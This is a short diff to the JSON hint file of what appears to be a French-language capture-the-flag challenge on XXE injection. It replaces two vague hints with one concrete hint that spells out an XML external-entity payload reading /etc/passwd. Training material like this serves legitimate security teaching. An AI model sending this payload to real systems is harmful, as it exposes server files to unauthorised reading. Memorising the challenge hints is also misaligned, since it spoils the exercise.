@@ -1,12 +1,7 @@
 [
   {
-    "title": "Indice 1 : Vecteur d'attaque",
+    "title": "Structure DTD",
     "cost": 15,
-    "content": "Recherche la documentation officielle et les techniques éprouvées pour exploiter xxe-entity."
-  },
-  {
-    "title": "Indice 2 : Format du drapeau",
-    "cost": 25,
-    "content": "Le drapeau respecte le format standard : CYBERLAB{...}."
+    "content": "Ajoute avant la racine : <!DOCTYPE foo [ <!ENTITY ext SYSTEM \"file:///etc/passwd\"> ]> et utilise &ext; dans un champ texte."
   }
 ]
